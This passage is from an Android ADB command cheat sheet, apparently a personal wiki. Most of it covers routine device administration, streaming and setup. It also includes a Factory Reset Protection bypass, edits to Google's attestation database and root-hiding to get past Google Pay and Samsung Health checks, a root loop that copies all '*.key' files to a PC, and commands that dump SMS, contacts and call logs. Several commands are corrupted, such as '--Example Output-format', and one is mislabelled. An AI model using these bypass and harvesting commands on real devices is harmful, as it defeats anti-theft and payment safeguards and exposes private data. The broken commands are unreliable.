-e phone \"$(dialog --stdout --inputbox 'Phone Number' 0 0)\" -e email \"$(dialog --stdout --inputbox 'Email' 0 0)\" Add a Contact - Example 2 am start -a android.intent.action.INSERT -t vnd.android.cursor.dir/contact -e name 'wuseman' -e phone <phone_number> Open Projectmenu (Huawei only) am start com.huawei.android.projectmenu/com.huawei.android.projectmenu.ProjectMenuActivity Make Demo Call Establishes a fake Bluetooth connection to Dialer and must be called first to enable access to all call-related commands. To connect a device adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"connect\" Place an outgoing call adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"addCall\" --es \"id\" \"4085524874\" Receive an incoming call adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"rcvCall\" --es \"id\" \"4085524874\" End a call adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"endCall\" --es \"id\" \"4085524874\" Hold the current call adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"holdCall\" Unhold the current call adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"unholdCall\" Merge calls adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"unholdCall\" Clear all calls, To remove all calls in the call list: adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"clearAll\" ADB acpi Get Battery Percentage acpi Show batteries acpi -b Show Cooling Device State acpi -c Show Temperatures acpi -t Just print everything from acpi acpi -V ADB dpm Enable Device Admin dpm set-device-owner com.package.name/.DeviceAdminReceiver ADB service StatusBar Expand Status Bar service call statusbar 1 Expand Status Bar service call statusbar 2 Collapse Status Bar service call statusbar 2 IMEI Related Slot 1 Print IMEI - Example 1 service call iphonesubinfo 1| cut -d \"'\" -f2| grep -Eo '[0-9]'| xargs| sed 's/\\ //g' Print IMEI - Example 2 service call iphonesubinfo 3 i32 1 | grep -oE '[0-9a-f]{8} ' | while read hex; do echo -ne \"\\u${hex:4:4}\\u${hex:0:4}\"; done; echo Print IMEI - Example 3 echo \"[device.imei]: [$(adb shell service call iphonesubinfo 1 | awk -F \"'\" '{print $2}' | sed '1 d'| tr -d '\\n' | tr -d '.' | tr -d ' ')]\" Print IMEI - Example 4 adb shell service call iphonesubinfo 1 | awk -F\"'\" 'NR>1 { gsub(/\\./,\"\",$2); imei=imei $2 } END {print imei}' Print IMEI - Example 5 adb shell \"service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'\" Print IMEI - Example 6 adb shell service call iphonesubinfo 1 | awk -F \"'\" '{print }' | sed '1 d' | tr -d '.' | awk '{print}' ORS= Slot 2 Some devices has 2 sim card slot, for print the second simcards imei use below: Print IMEI - Slot 2 service call iphonesubinfo 3 i32 2 | grep -oE '[0-9a-f]{8} ' | while read hex; do echo -ne \"\\u${hex:4:4}\\u${hex:0:4}\"; done; echo ADB settings List how many times we booted device: settings list global|grep \"boot_count=\"|cut -d= -f2|head -n 1|xargs echo \"Booted:\"|sed 's/$/ times/g' Hide Status bar settings put global policy_control immersive.status=* Hide Navigation bar settings put global policy_control immersive.navigation=* Hide both status and navigation bars settings put global policy_control immersive.full=* Revert bars to stock configuration settings put global policy_control null* It is also possible to specify this behavior for a specific application. Examples to modify the behavior when Enterprise Browser is in the foreground: settings put global policy_control immersive.full=com.honeywell.enterprisebrowser settings put global policy_control immersive.navigation=com.honeywell.enterprisebrowser settings put global policy_control immersive.status=com.honeywell.enterprisebrowser ADB content Trick device that setup already has been done (FRP Bypassing) content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1 am start -n com.google.android.gsf.login/ am start -n com.google.android.gsf.login.LoginActivity Global/Settings/Secure content query --uri content://settings/global content query --uri content://settings/settings content query --uri content://settings/seure Print files for all applications content query --uri content://media/external/file --projection _data Select \"name\" and \"value\" columns from secure settings where \"name\" is equal to \"new_setting\" and sort the result by name in ascending order content query --uri content://settings/secure --projection name:value Remove \"new_setting\" secure setting. content delete --uri content://settings/secure --where \"name='new_setting'\" Download current ringtone and play on PC via ffplay: adb shell 'content read --uri content://settings/system/ringtone_cache' > a.ogg|xargs ffplay a.ogg Various ways to print contacts content query --uri content://contacts/phones/ --projection display_name:number:notes content query --uri content://com.android.contacts/data --projection display_name:data1:data4:contact_id content query --uri content://contacts/people/ Print Contacts Phone Numbers: content query --uri content://contacts/phones/ Print Contacts Added In Groups: content query --uri content://contacts/groups/ Print Group Mmembership: content query --uri content://contacts/groupmembership/ Print organiztations: content query --uri content://contacts/organizations/ Print Call Logs content query --uri content://call_log/calls Print text from SMS sections content query --uri content://sms/conversations content query --uri content://sms/conversations content query --uri content://sms/draft content query --uri content://sms/inbox content query --uri content://sms/outbox content query --uri content://sms/sent Print text from MMS sections content query --uri content://mms content query --uri content://mms/inbox content query --uri content://mms/outbox content query --uri content://mms/part content query --uri content://mms/sent content query --uri content://mms-sms/conversations content query --uri content://mms-sms/draft content query --uri content://mms-sms/locked content query --uri content://mms-sms/search Auto rotation on content insert \u2013uri content://settings/system \u2013bind name:s:accelerometer_rotation \u2013bind value:i:1 Auto rotation off content insert \u2013uri content://settings/system \u2013bind name:s:accelerometer_rotation \u2013bind value:i:0 Rotate to landscape content insert \u2014uri content://settings/system \u2013bind name:s:user_rotation \u2013bind value:i:1 Rotate portrait content insert \u2013uri content://settings/system \u2013bind name:s:user_rotation \u2013bind value:i:0 ADB input Simulate a swipe down for notification bar: input swipe 0 0 0 300 Swipe and unlock screen: input swipe 300 1000 300 500 ADB wm Print Screen Resolution wm size Set Screen Size wm size WxH Set Overscan: wm overscan 0,0,0,200 ADB getprop It is not so much to describe here, get info via getprop command. Example Usage getprop | grep \"model\\|version.sdk\\|manufacturer\\|hardware\\|platform\\|revision\\|serialno\\|product.name\\|brand\" Print CPU abi getprop ro.product.cpu.abi Get info if OEM Unlock is Allowed 1 = Enabled 0 = Disabled getprop sys.oem_unlock_allowed Is System boot completed getprop sys.boot_completed ADB setprop Auto answer any call after 2 seconds: setprop persist.sys.tel.autoanswer.ms 2000 Turn off auto answer: setprop persist.sys.tel.autoanswer.ms 0 ADB /sys Set Screen Brightness Set Brightness Off 0 is the same as 1 echo 1 > /sys/class/backlight/panel/brightness Set to maximum echo 48600 > /sys/class/backlight/panel/brightness Set to max normal echo 255 > /sys/class/backlight/panel/brightness Try vibrator echo 200 > /sys/class/timed_Example Output/vibrator/enable Print USB Mode (Charging only, MTP) cat /sys/devices/soc0/hw_platform' ADB sm Adopting USB-Drive sm set-force-adoptable true ADB keytool Genereate hash from keystore -Typically used in Facebook keytool -exportcert -alias your_alias -keystore debug.keystore | openssl sha1 -binary | openssl base64 Typically used in Google Maps keytool -list -v -keystore ~/.android/debug.keystore -alias your_alias ADB monkey Test any app by pressing 10000 times at once, this will start your application and perform 10000 random events.# monkey -p com.example.myapp -v 10000 Example Output com.google.android.youtube/.app.honeycomb.Shell$HomeActivity com.google.android.googlequicksearchbox/.SearchActivity com.google.android.apps.docs.editors.docs/com.google.android.apps.docs.app.NewMainProxyActivity com.android.documentsui/.LauncherActivity com.google.android.apps.docs.editors.sheets/com.google.android.apps.docs.app.NewMainProxyActivity com.google.android.apps.docs.editors.slides/com.google.android.apps.docs.app.NewMainProxyActivity com.android.vending/.AssetBrowserActivity ADB sqlite3 Read SIM Card info sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select icc_id,card_id,carrier_name,display_name,mcc,mnc from siminfo' Example Output icc_id = 8946209802SSSSSSSSS card_id = 8946209802SSSSSSSSS display_name = CARD mcc = 0 mnc = 0 icc_id = 8946209802SSSSSSSSS card_id = 8946209802SSSSSSSSS carrier_name = Telia display_name = Telia mcc = 240 mnc = 7 Read All SIM Card Info sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * from siminfo' Print ICCID sqlite3 /data/vendor/radio/qcril.db 'select ICCID from qcril_manual_prov_table' Print data in .db files, clean: grep -vx -f <(sqlite3 Main.db .dump) <(sqlite3 ${DB} .schema) Use below command fr update dg.db file: sqlite3 /data/data/com.google.android.gms/databases/dg.db \"update main set c='0' where a like '%attest%';\" Grab all file extensions of a kind and download to PC for i in ` adb shell \"su -c find /data /system -name '*.key'\" ` ; do mkdir -p \".`dirname $i `\" ; adb shell \"su -c cat $i \" > \". $i \" ; done Print uptime for your device by days + time TZ = UTC date -d@ $( cut -d \\ -f1 /proc/uptime ) + '%j %T' | awk '{print $1-1\"d\",$2}' Android paths /data/ssh /data/adb/magisk /data/data/<package>/databases (app databases) /data/data/<package>/shared_prefs/ (shared preferences) /data/app (apk installed by user) /system/app (pre-installed APK files) /mmt/asec (encrypted apps) (App2SD) /mmt/emmc (internal SD Card) /mmt/adcard (external/Internal SD Card) /mmt/adcard/external_sd (external SD Card) Android root Commands for rooted devices Find out if the device is rooted and if su exist which su &> /dev/null;[[ $? = \"0\" ]] && echo \"Rooted\" || echo \"Not rooted\" Bypass Google Pay Block Stop wallnetfcrel am force-stop /data/data/com.google.android.apps.walletnfcrel Hide root for Google apps: for google_apps in $( cmd package list packages | grep -i com.google | cut -d: -f2 ) ; do magiskhide add ${ google_apps } ; done Change permissions on dg.db to read-and-write: su sh -c chmod 0777 /data/data/com.google.android.gms/databases/dg.db Now change permissions on dg.db to 0444 chmod 0444 /data/data/com.google.android.gms/databases/dg.db Clear cache for your Google Pay application and have fun! :) Grab all file extensions of a kind and download to PC for i in ` adb shell \"su -c find /data /system -name '*.key'\" ` ; do mkdir -p \".`dirname $i `\" ; adb shell \"su -c cat $i \" > \". $i \" ; done Android wuseman's notices Find out happens when we remove below file rm /data/misc/bootstat/boot_complete? Android magisk (updated version - zygisk - comming soon) ..... will be added very soon. Android magisk (older versions) Enable magiskhide /sbin/magisk magiskhide enable List hided apps by magisk /sbin/magisk magiskhide list Add package to magiskhide /sbin/magisk magiskhide add com.package ADB commands sorted by brand Samsung Bypass Samsung Health block on rooted samsung devices mount -o rw,remount /system/etc/mkshrc sed -i 's/ro.config.tima=1/ro.config.tima=0/g' build.prop ADB screencap screencap /storage/emulated/0/Pictures/screenshot.png ADB screenrecord screenrecord --time-limit 10 /storage/emulated/0/Video/record.mp4 Android FRP Bypass wuseman - Samsung Galaxy A10 wuseman - Samsung Galaxy A10 wuseman - Samsung Galaxy A5 wuseman - Samsung Galaxy S10 wuseman - Samsung Galaxy S8 wuseman - Samsung Galaxy Xcover 4 wuseman - Motorola Moto E4 Plus wuseman - Huawei MediaTab T5 wuseman - LG G6 Similiar websites Gentoo Wiki Gentoo Wiki - ADB ( Maintained by wuseman ) Nr1 / wuseman Nr1 - Your journey to master Android\u2122 Shell begins here wuseman - ADB Cheatsheet Stackoverflow - Bluetooth ADB Shell * ADB Shell - Just Another ADB Cheatsheet wiki Android Android\u2122 Developer - Emulator Console Android\u2122 Developer - Write your app Android\u2122 Google Source - Source Code Android\u2122 Google Source - CMD Command Android\u2122 Generic Project Android\u2122 GDB Android\u2122 Source - Understand Logging Android\u2122 Source - Network Connectivity Tests Android\u2122 Platform Tools Github Github Randorise - Mobile Hacking CheatSheet Mazhuang Mazhuang - Awesome ADB - Another Cheatsheet Wiki Jfsso Jfsso - Preferences Editor Nahamsec Nahamsec - Resources For Beginner - Bug Bounty Hunters Raywenderlich Raywenderlich -Forensic Artifacts Noobsec Noobsec - Bypass Fingerprint Lock In Just 1 Second Noobsec - Cara Reverse Engineering Oracle Oracle- JVMS Tjtech Tjtech - Analyze OEM Unlocking Under Android U'Smile U'Smile - How to change the IMEI on Android devices XDA Developers Android\u2122 Q Navigation - Gesture Controls Get in Touch Want your website listed here and you think you have something to contribute? Send me an email or contact me on \u00cdRC: iRC : wuseman@ Libera Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Mail : wuseman@ nr1.nu Wiki author wuseman < wuseman@nr1.nu > * Wiki License Android Nr1 nu wiki is licensed under the GNU General Public License v3.0 - See the LICENSE.md file for details Happy Hacking!","title":"adb"},{"location":"android/adb/readme/#for-frp-bypass-and-hack-any-samsung-device-with-android-12-installed-see-my-wiki","text":"Samsung Android 12 FRPBypass - All models","title":"For FRP Bypass and hack any Samsung device with Android 12 installed, see my wiki:"},{"location":"android/adb/readme/#websites-linked-to-this-repository","text":"Android\u2122 Debug Bridge - Main Android\u2122 Debug Bridge - Wiki","title":"Websites linked to this Repository"},{"location":"android/adb/readme/#download-android-google-account-manager","text":"Google Account Manager Android 4.0.3 Google Account Manager Android 4.4.4 Google Account Manager Android 5.0.1 Google Account Manager Android 6.0 Google Account Manager Android 7.0 Google Account Manager Android 7.1.2 Google Account Manager Android 7.1.25 Google Account Manager Android 8.0 Google Account Manager Android 8.1 Google Account Manager Android 9 Google Account Manager Android 10","title":"Download Android\u2122 Google Account Manager"},{"location":"android/adb/readme/#custom-apks--blocked","text":"On rooted devices samsung health crashing and wont launch anymore and it wont help to change tima from 1 to 0 in build.prop anymore, download the below apk instead to get samsung health working on your rooted device Samsung Health - Android 12","title":"Custom Apks \u2122 Blocked"},{"location":"android/adb/readme/#open-android-applications","text":"Links works when you clicking the links with your mobile device, please visit android.nr1.nu to get clickable links. Click to Erase Lock Settings (dont press unless you frp unlocking) Click to Open My Files Google Search App Samsung Apps Alliance Shield X (Galaxy Store)","title":"Open Android\u2122 Applications"},{"location":"android/adb/readme/#android-source-code","text":"Android\u2122 Source Code","title":"Android\u2122 Source Code"},{"location":"android/adb/readme/#android-issue-tracker","text":"Android\u2122 Issue Tracker","title":"Android\u2122 Issue Tracker"},{"location":"android/adb/readme/#adb-install","text":"","title":"ADB install"},{"location":"android/adb/readme/#source-files","text":"Download SDK Platform-Tools for Linux Download SDK Platform-Tools for MacOSX Download SDK Platform-Tools for Windows","title":"Source Files"},{"location":"android/adb/readme/#macosx","text":"1. Download the Android SDK Platform Tools ZIP file for macOS. 2. Extract the ZIP to an easily-accessible location (like the Desktop for example). 3. Open Terminal. 4. To browse to the folder you extracted ADB into, enter the following command: cd /path/to/extracted/folder/ 5. For example, on my Mac it was this: cd /Users/Doug/Desktop/platform-tools/ 6. Connect your device to your Mac with a compatible USB cable. Change the USB connection mode to \u201cfile transfer (MTP)\u201d mode. This is not always required for every device, but it\u2019s best to just leave it in this mode so you don\u2019t run into any issues. 7. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices 8. On your device, you\u2019ll see an \u201cAllow USB debugging\u201d prompt. Allow the connection. 9. Finally, re-enter the command from step #7. If everything was successful, you should now see your device\u2019s serial number in macOS\u2019s Terminal window.","title":"MacOSX"},{"location":"android/adb/readme/#linux","text":"1. Download the Android SDK Platform Tools ZIP file for Linux. 2. Extract the ZIP to an easily-accessible location (like the Desktop for example). 3. Open a Terminal window. 4. Enter the following command: cd /path/to/extracted/folder/ 5. This will change the directory to where you extracted the ADB files. 6. So for example: cd /Users/Doug/Desktop/platform-tools/ 7.Connect your device to your Linux machine with your USB cable. Change the connection mode to \u201cfile transfer (MTP)\u201d mode. This is not always necessary for every device, but it\u2019s recommended so you don\u2019t run into any issues. 8. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices 9. Back on your smartphone or tablet device, you\u2019ll see a prompt asking you to allow USB debugging. Go ahead and grant it.","title":"Linux"},{"location":"android/adb/readme/#windows-10","text":"1: Download: https://dl.google.com/android/repository/platform-tools-latest-windows.zip 2: Extract the contents of this ZIP file into an easily accessible folder (such as C:\\platform-tools) 3: Open Windows explorer and browse to where you extracted the contents of this ZIP file 4: Then open up a Command Prompt from the same directory as this ADB binary. This can be done by holding Shift and Right-clicking within the folder then click the \u201cOpen command window here\u201d option. 5: Connect your smartphone or tablet to your computer with a USB cable. Change the USB mode to \u201cfile transfer (MTP)\u201d mode. Some OEMs may or may not require this, but it\u2019s best to just leave it in this mode for general compatibility. 6: In the Command Prompt window, enter the following command to launch the ADB daemon: adb devices 7: On your phone\u2019s screen, you should see a prompt to allow or deny USB Debugging access. Naturally, you will want to grant USB Debugging access when prompted (and tap the always allow check box if you never want to see that prompt again). 8: Finally, re-enter the command from step #6. If everything was successful, you should now see your device\u2019s serial number in the command prompt (or the PowerShell window).","title":"Windows 10"},{"location":"android/adb/readme/#arch-linux","text":"pacman -S android-tools","title":"Arch Linux"},{"location":"android/adb/readme/#gentoo","text":"emerge --ask dev-util/android-sdk-update-manager","title":"Gentoo"},{"location":"android/adb/readme/#fedora","text":"dnf install adb","title":"Fedora"},{"location":"android/adb/readme/#ubuntu","text":"apt install adb fastboot -y","title":"Ubuntu"},{"location":"android/adb/readme/#android-files","text":"","title":"Android\u2122 files"},{"location":"android/adb/readme/#sms-and-phone-phone-logs-is-stored-in-below-files","text":"/data/user_de/0/com.android.providers.telephony/databases/mmssms.db /data/user_de/0/com.android.providers.telephony/databases/telephony.db","title":"SMS and Phone Phone logs is stored in below files"},{"location":"android/adb/readme/#audio-files-is-stored-in","text":"/system/media/audio/ui/ /system/media/audio/ringtones /system/media/audio/notifications","title":"Audio files is stored in"},{"location":"android/adb/readme/#adb-commands","text":"","title":"ADB commands"},{"location":"android/adb/readme/#start-adb-server","text":"adb start-server","title":"Start ADB server:"},{"location":"android/adb/readme/#stop-adb-server","text":"adb stop-server","title":"Stop ADB server:"},{"location":"android/adb/readme/#kill-adb-server","text":"adb kill-server","title":"Kill ADB server:"},{"location":"android/adb/readme/#setup-adb-server-via-wi-fi","text":"adb tcpip <port>","title":"Setup ADB server via Wi-Fi"},{"location":"android/adb/readme/#connect-to-adb-server","text":"adb connect <device_ip>","title":"Connect to ADB server:"},{"location":"android/adb/readme/#restarts-the-adbd-daemon-listening-on-usb","text":"adb usb","title":"Restarts the adbd daemon listening on USB"},{"location":"android/adb/readme/#list-connected-devices","text":"adb devices","title":"List Connected Devices:"},{"location":"android/adb/readme/#get-status","text":"adb get-state","title":"Get Status:"},{"location":"android/adb/readme/#print-serial-number","text":"adb get-serialno","title":"Print Serial Number:"},{"location":"android/adb/readme/#backup-device","text":"adb backup -all","title":"Backup Device:"},{"location":"android/adb/readme/#restore-device","text":"adb restore /path/to/backupflile.adb","title":"Restore Device:"},{"location":"android/adb/readme/#enter-adb-shell","text":"adb shell","title":"Enter ADB shell:"},{"location":"android/adb/readme/#enter-adb-shell-if-there-is-multiple-devices-connected","text":"adb -s <id_from_adb_devices> shell","title":"Enter ADB shell if there is multiple devices connected:"},{"location":"android/adb/readme/#to-print-device-serial-no","text":"adb get-serialno","title":"To print device serial no:"},{"location":"android/adb/readme/#create-a-bugreport","text":"adb bugreport","title":"Create a bugreport:"},{"location":"android/adb/readme/#install-an-app","text":"adb install <apk_file>","title":"Install an app:"},{"location":"android/adb/readme/#install-an-app-and-keep-all-its-data-from-a-previous-setup","text":"adb install -r <apk_file>","title":"Install an app and keep all it's data from a previous setup:"},{"location":"android/adb/readme/#uninstall-an-app","text":"adb uninstall <apk_file>","title":"Uninstall an app:"},{"location":"android/adb/readme/#push-a-file","text":"adb push = tansfer a file: pc > device adb push mypicture.png /storage/on/device","title":"Push a file"},{"location":"android/adb/readme/#push-a-folder-transfer-a-folder-from-pc--device","text":"adb push myfolder /storage/on/device","title":"Push a folder (Transfer a folder FROM pc &gt; device)"},{"location":"android/adb/readme/#pull-a-file","text":"adb pull = tansfer a file: device > pc adb pull /storage/on/device/mypicture.png /path/on/pc","title":"Pull a file"},{"location":"android/adb/readme/#pull-a-folder-transfer-a-folder-from-device--pc","text":"adb pull /storage/on/device /path/on/pc","title":"Pull a folder (Transfer a folder FROM device &gt; pc)"},{"location":"android/adb/readme/#pull-installed-apk-files","text":"Script for pull all installed Apks Script for pull all installed system Apks Script for pull all Apks installed by you","title":"Pull installed apk files"},{"location":"android/adb/readme/#pull-all-files-inside-a-folder-to-a-path-transfer-all-files-in-a-folder-from-device--pc","text":"adb pull /storage/on/device/ /path/on/pc # Notice the trial slash","title":"Pull all files inside a folder to a path (Transfer all files in a folder FROM device &gt; pc)"},{"location":"android/adb/readme/#adb-exec-out","text":"Stream Device Screen on your PC","title":"ADB exec-out"},{"location":"android/adb/readme/#tips-wanted","text":"Does anyone know how to to view AND record the stream at same time? Let me know! Exec Out Syntax adb exec-out screenrecord --Example Output-format=h264 - | prefered tool - <stdin>","title":"TIPS WANTED!"},{"location":"android/adb/readme/#stream-via-mplayer-recommended","text":"Recommended since it is starts immediately, very little delay, and doesn't freak out like vlc. adb exec-out screenrecord --output-format=h264 - | ffplay -framerate 60 -probesize 32 -sync video - ffplay works, but it seems to take a few seconds to decide to start, and ends up lagging well behind the entire time.","title":"Stream via Mplayer (Recommended)"},{"location":"android/adb/readme/#stream-via-ffplay","text":"FFPlay Default - No Settings adb shell screenrecord --Example Output-format=h264 - | ffplay - FFplay Customized adb exec-out screenrecord --Example Output-format = h264 - | ffplay -framerate 60 -probesize 32 -sync video - adb shell screenrecord --bit-rate = 16m --Example Output-format = h264 --size 800x600 - | ffplay -framerate 60 -framedrop -bufsize 16M - FFplay Customized - Stream vin 1080p adb exec-out screenrecord --bit-rate = 16m --Example Output-format = h264 --size 1920x1080 -","title":"Stream via FFPLay"},{"location":"android/adb/readme/#stream-via-vlc","text":"Adding \u2013clock-jitter=0 seems to make the errors less traumatic, but it's still pretty messed up vlc is not recommended for this, use FFplay or Mplayer if possible Stream via VLC on Windows adb exec-out screenrecord --bit-rate = 4m --Example Output-format = h264 --size 800x600 --show-frame-time - \\ | \"c:\\Program Files\\VideoLAN\\VLC\\vlc\" --demux h264 - vlc://quit Record your device screen via VLC on Windows adb exec-out screenrecord --bit-rate = 4m --Example Output-format = h264 --size 800x600 --show-frame-time - \\ | \"c:\\Program Files\\VideoLAN\\VLC\\vlc\" --demux h264 --sout file/ts:c: \\t emp \\s creenrec.mpg - vlc://quit","title":"Stream via VLC"},{"location":"android/adb/readme/#network-analyze","text":"Sniff your device network and SMS traffic via Wireshark on your PC adb exec-out \"tcpdump -i any -U -w - 2>/dev/null\" | wireshark -k -S -i -","title":"Network Analyze"},{"location":"android/adb/readme/#adb-reboot","text":"","title":"ADB reboot"},{"location":"android/adb/readme/#system","text":"adb reboot","title":"System"},{"location":"android/adb/readme/#recovery","text":"adb reboot recovery","title":"Recovery"},{"location":"android/adb/readme/#bootloader","text":"adb reboot bootloader","title":"Bootloader"},{"location":"android/adb/readme/#fastboot-some-brands","text":"adb reboot fastboot","title":"Fastboot (some brands)"},{"location":"android/adb/readme/#adb-date","text":"","title":"ADB date"},{"location":"android/adb/readme/#set-date","text":"date MMDDYYYY.XX;am broadcast -a android.intent.action.TIME_SET","title":"Set date"},{"location":"android/adb/readme/#adb-cmd","text":"","title":"ADB cmd"},{"location":"android/adb/readme/#cmd-testharness","text":"About: Test Harness Mode is a mode that the device can be placed in to prepare the device for running UI tests. The device is placed into this mode by first wiping all data from the device, preserving ADB keys. By default, the following settings are configured: * Package Verifier is disabled * Stay Awake While Charging is enabled * OTA Updates are disabled * Auto-Sync for accounts is disabled Other apps may configure themselves differently in Test Harness Mode by checking ActivityManager.isRunningInUserTestHarness() Test Harness Mode commands: help Print this help text. enable|restore Erase all data from this device and enable Test Harness Mode, preserving the stored ADB keys currently on the device and toggling settings in a way that are conducive to Instrumentation testing.","title":"cmd testharness"},{"location":"android/adb/readme/#cmd-stats-meminfo","text":"*Prints the malloc debug information. You need to run the following first: adb shell stop adb shell setprop libc.debug.malloc.program statsd adb shell setprop libc.debug.malloc.options backtrace adb shell start cmd stats print-stats","title":"cmd stats meminfo"},{"location":"android/adb/readme/#send-a-broadcast-that-triggers-the-subscriber-to-fetch-metrics","text":"cmd stats send-broadcast [UID] NAME UID The uid of the configuration. It is only possible to pass the UID parameter on eng builds. If UID is omitted the calling uid is used. NAME The name of the configuration","title":"Send a broadcast that triggers the subscriber to fetch metrics."},{"location":"android/adb/readme/#flushes-all-data-on-memory-to-disk","text":"cmd stats write-to-disk","title":"Flushes all data on memory to disk."},{"location":"android/adb/readme/#prints-the-uid-app-name-version-mapping","text":"cmd stats print-uid-map","title":"Prints the UID, app name, version mapping."},{"location":"android/adb/readme/#log-a-binary-push-state-changed-event","text":"cmd stats log-binary-push NAME VERSION STAGING ROLLBACK_ENABLED LOW_LATENCY STATE EXPERIMENT_IDS NAME The train name. VERSION The train version code. STAGING If this train requires a restart. ROLLBACK_ENABLED If rollback should be enabled for this install. LOW_LATENCY If the train requires low latency monitoring. STATE The status of the train push. Integer value of the enum in atoms.proto. EXPERIMENT_IDS Comma separated list of experiment ids. Leave blank for none.","title":"Log a binary push state changed event."},{"location":"android/adb/readme/#hide-all-notifications-icons-on-status-bar","text":"cmd statusbar send-disable-flag notification-icons","title":"Hide all notifications icons on Status Bar"},{"location":"android/adb/readme/#reset-all-flags-to-default","text":"cmd statusbar send-disable-flag none","title":"Reset all flags to default"},{"location":"android/adb/readme/#print-status-bar-icons","text":"cmd statusbar get-status-icons","title":"Print Status Bar Icons"},{"location":"android/adb/readme/#print-preferences-for-status-bar","text":"cmd statusbar prefs list-prefs","title":"Print Preferences for Status Bar"},{"location":"android/adb/readme/#expand-status-bar","text":"cmd statusbar expand-notifications","title":"Expand Status Bar"},{"location":"android/adb/readme/#collapse-status-bar","text":"cmd statusbar collapse","title":"Collapse Status Bar"},{"location":"android/adb/readme/#expand-full-settings","text":"cmd statusbar expand-settings","title":"Expand Full Settings"},{"location":"android/adb/readme/#status-bar-help","text":"cmd statusbar help","title":"Status Bar Help"},{"location":"android/adb/readme/#print-auth-user","text":"cmd user list","title":"Print auth user"},{"location":"android/adb/readme/#enable-night-mode-dark-mode","text":"cmd uimode night yes","title":"Enable night mode (Dark Mode)"},{"location":"android/adb/readme/#disable-night-mode","text":"cmd uimode night no","title":"Disable night mode"},{"location":"android/adb/readme/#enable-car-mode","text":"cmd uimode car yes","title":"Enable car Mode"},{"location":"android/adb/readme/#disable-car-car-mode","text":"cmd uimode car no","title":"Disable car (car Mode)"},{"location":"android/adb/readme/#scan-for-nearby-ssids-give-it-7-seconds-for-scan-and-fetch-some-wifi-data","text":"cmd -w wifi start-scan sleep 7 cmd -w wifi list-scan-results","title":"Scan for nearby ssid:s, give it 7 seconds for scan and fetch some wifi data"},{"location":"android/adb/readme/#sets-whether-we-are-in-the-middle-of-an-emergency-call","text":"Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED broadcast. cmd -w wifi set-emergency-call-state enabled|disabled","title":"Sets whether we are in the middle of an emergency call."},{"location":"android/adb/readme/#sets-whether-emergency-callback-mode-ecbm-is-enabled","text":"cmd -w wifi set-emergency-callback-mode enabled|disabled","title":"Sets whether Emergency Callback Mode (ECBM) is enabled."},{"location":"android/adb/readme/#lists-the-suggested-networks-from-the-app","text":"cmd -w wifi list-suggestions-from-app <package name>","title":"Lists the suggested networks from the app"},{"location":"android/adb/readme/#lists-all-suggested-networks-on-this-device","text":"cmd -w wifi list-all-suggestions","title":"Lists all suggested networks on this device"},{"location":"android/adb/readme/#note-this-only-returns-whether-the-app-was-set-via-the-network-requests-set-user-approved-shell-command","text":"Queries whether network requests from the app is approved or not. cmd -w wifi network-requests-has-user-approved <package name>","title":"Note: This only returns whether the app was set via the 'network-requests-set-user-approved' shell command"},{"location":"android/adb/readme/#note-only-1-such-app-can-be-approved-from-the-shell-at-a-time","text":"Sets whether network requests from the app is approved or not. cmd -w wifi network-requests-set-user-approved <package name> yes|no","title":"Note: Only 1 such app can be approved from the shell at a time"},{"location":"android/adb/readme/#lists-the-requested-networks-added-via-shell","text":"cmd -w wifi list-requests","title":"Lists the requested networks added via shell"},{"location":"android/adb/readme/#removes-all-active-requests-added-via-shell","text":"cmd -w wifi remove-all-requests","title":"Removes all active requests added via shell"},{"location":"android/adb/readme/#remove-a-network-request-with-provided-ssid-of-the-network","text":"cmd -w wifi remove-request <ssid>","title":"Remove a network request with provided SSID of the network"},{"location":"android/adb/readme/#add-a-network-request-with-provided-params","text":"cmd -w wifi add-request <ssid> open|owe|wpa2|wpa3 [<passphrase>] [-b <bssid>]","title":"Add a network request with provided params"},{"location":"android/adb/readme/#initiates-wifi-settings-reset","text":"cmd -w wifi settings-reset","title":"Initiates wifi settings reset"},{"location":"android/adb/readme/#gets-softap-supported-features-will-print-wifi_softap_acs_supported","text":"cmd -w wifi get-softap-supported-features","title":"Gets softap supported features. Will print 'wifi_softap_acs_supported'"},{"location":"android/adb/readme/#gets-setting-of-wifi-watchdog-trigger-recovery","text":"cmd -w wifi get-wifi-watchdog","title":"Gets setting of wifi watchdog trigger recovery."},{"location":"android/adb/readme/#sets-whether-wifi-watchdog-should-trigger-recovery","text":"cmd -w wifi set-wifi-watchdog enabled|disabled","title":"Sets whether wifi watchdog should trigger recovery"},{"location":"android/adb/readme/#sets-country-code-to--or-left-for-normal-value","text":"cmd -w wifi force-country-code enabled <two-letter code> | disabled","title":"Sets country code to  or left for normal value"},{"location":"android/adb/readme/#manually-triggers-a-link-probe","text":"cmd -w wifi send-link-probe","title":"Manually triggers a link probe."},{"location":"android/adb/readme/#clears-the-user-disabled-networks-list","text":"cmd -w wifi clear-user-disabled-networks","title":"Clears the user disabled networks list."},{"location":"android/adb/readme/#removes-all-user-approved-network-requests-for-the-app","text":"cmd -w wifi network-requests-remove-user-approved-access-points <package name>","title":"Removes all user approved network requests for the app."},{"location":"android/adb/readme/#clear-the-user-choice-on-imsi-protection-exemption-for-carrier","text":"cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier <carrier id>","title":"Clear the user choice on Imsi protection exemption for carrier"},{"location":"android/adb/readme/#queries-whether-imsi-protection-exemption-for-carrier-is-approved-or-not","text":"cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier <carrier id>","title":"Queries whether Imsi protection exemption for carrier is approved or 